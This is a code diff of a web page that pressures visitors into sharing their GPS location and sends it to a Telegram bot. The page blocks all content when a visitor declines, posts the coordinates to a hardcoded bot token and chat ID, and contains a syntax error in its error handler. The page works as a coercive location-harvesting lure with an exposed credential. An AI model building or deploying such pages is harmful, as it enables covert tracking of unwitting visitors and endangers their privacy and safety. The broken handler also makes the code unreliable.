@@ -5,47 +5,96 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Send Location to Telegram</title>
 <script src="https://cdn.tailwindcss.com"></script>
+
 <style>
-/* GPS spinning animation */
-@keyframes spin {
-  0% { transform: rotate(0deg);}
-  100% { transform: rotate(360deg);}
+/* Popup fade-in */
+@keyframes fadeIn {
+  from { opacity: 0; }
+  to { opacity: 1; }
 }
-.spinner {
-  animation: spin 1s linear infinite;
+.fade-in {
+  animation: fadeIn 0.4s ease-in-out;
 }
 
-/* Fade-in animation for the button */
-.fade-in {
-  opacity: 0;
-  transform: translateY(20px);
-  animation: fadeInUp 0.8s forwards;
+/* Spinner animation */
+@keyframes spin { 
+  0% { transform: rotate(0deg);} 
+  100% { transform: rotate(360deg);} 
 }
-@keyframes fadeInUp {
-  to { opacity: 1; transform: translateY(0);}
-}
+.spinner { animation: spin 1s linear infinite; }
+
 </style>
 </head>
+
 <body class="bg-gradient-to-r from-blue-400 via-purple-500 to-pink-500 h-screen flex items-center justify-center font-sans">
-<div class="bg-white rounded-3xl shadow-2xl p-10 w-full max-w-md text-center">
-    <h1 class="text-2xl font-bold mb-4">Please Enable Your Location</h1>
+
+<!-- POPUP -->
+<div id="popup" class="fade-in fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center">
+    <div class="bg-white p-8 rounded-3xl text-center shadow-2xl w-80">
+        <h2 class="text-xl font-bold mb-4">Please enable your location</h2>
+        <p class="text-gray-600 mb-6">
+            Do you agree to activate your device location?
+        </p>
+
+        <div class="flex justify-center gap-4">
+            <button id="yesBtn" class="bg-green-500 hover:bg-green-600 text-white px-4 py-2 rounded-full">
+                Yes
+            </button>
+
+            <button id="noBtn" class="bg-red-500 hover:bg-red-600 text-white px-4 py-2 rounded-full">
+                No
+            </button>
+        </div>
+    </div>
+</div>
+
+<!-- MAIN CONTENT -->
+<div id="main" class="hidden bg-white rounded-3xl shadow-2xl p-10 w-full max-w-md text-center">
+    <h1 class="text-2xl font-bold mb-4">Location Access</h1>
+
     <div id="status" class="text-gray-700 mb-6 flex justify-center items-center">
         <svg class="spinner w-8 h-8 mr-2 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-          <circle cx="12" cy="12" r="10" stroke-width="4" stroke-linecap="round"></circle>
+          <circle cx="12" cy="12" r="10" stroke-width="4"></circle>
         </svg>
         Waiting for location...
     </div>
-    <button id="sendLocation" class="fade-in bg-blue-600 hover:bg-blue-700 text-white px-6 py-3 rounded-full shadow-lg transition-all duration-300" style="display:none;">
+
+    <button id="sendLocation" 
+            class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-3 rounded-full shadow-lg transition-all duration-300 hidden">
         Send Location to Telegram
     </button>
 </div>
+
 
 <script>
 const BOT_TOKEN = "7851461640:AAFsqqe9niiYzPRuAZl3qK22e8aX3ZdJk4k";
 const CHAT_ID = "7570861617";
 
+const popup = document.getElementById("popup");
+const main = document.getElementById("main");
+const yesBtn = document.getElementById("yesBtn");
+const noBtn = document.getElementById("noBtn");
+const sendBtn = document.getElementById("sendLocation");
+
+// IF USER CLICKS YES
+yesBtn.onclick = () => {
+    popup.style.display = "none";
+    main.classList.remove("hidden");
+    requestLocation();
+};
+
+// IF USER CLICKS NO — BLOCK THE WEBSITE
+noBtn.onclick = () => {
+    document.body.innerHTML = `
+        <div class="h-screen flex items-center justify-center text-white text-2xl font-bold">
+            You cannot enter without allowing location access.
+        </div>
+    `;
+};
+
 function showError(message){
-    document.getElementById("status").innerHTML = <span class="text-red-500 font-semibold">${message}</span>;
+    document.getElementById("status").innerHTML =
+        <span class="text-red-500 font-semibold">${message}</span>;
 }
 
 function sendLocationToTelegram(lat, lon) {
@@ -59,40 +108,39 @@ function sendLocationToTelegram(lat, lon) {
     }).then(res => {
         if(res.ok){
             document.getElementById("status").innerHTML = "✅ Location sent successfully!";
-            document.getElementById("sendLocation").style.display = "none";
+            sendBtn.classList.add("hidden");
         } else {
-            showError("Error sending location! Please try again.");
+            showError("Error sending location. Try again.");
         }
     }).catch(err => showError("Error: " + err));
 }
 
 function requestLocation() {
     if(!navigator.geolocation){
-        showError("Geolocation is not supported by your browser!");
+        showError("Your browser does not support geolocation.");
         return;
     }
 
     navigator.geolocation.getCurrentPosition(
-        position => {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            document.getElementById("status").innerHTML = "📍 Location ready to send.";
-            const btn = document.getElementById("sendLocation");
-            btn.style.display = "inline-block";
-            btn.onclick = () => sendLocationToTelegram(lat, lon);
+        pos => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+
+            document.getElementById("status").innerHTML = "📍 Location ready.";
+
+            sendBtn.classList.remove("hidden");
+            sendBtn.onclick = () => sendLocationToTelegram(lat, lon);
         },
-        error => {
-            if(error.code === error.PERMISSION_DENIED){
-                showError("Please enable location access to continue.");
+        err => {
+            if(err.code === err.PERMISSION_DENIED){
+                showError("You must allow location to continue.");
             } else {
-                showError("Error getting location: " + error.message);
+                showError("Error getting location: " + err.message);
             }
         }
     );
 }
-
-// Request location on page load
-requestLocation();
 </script>
+
 </body>
 </html>
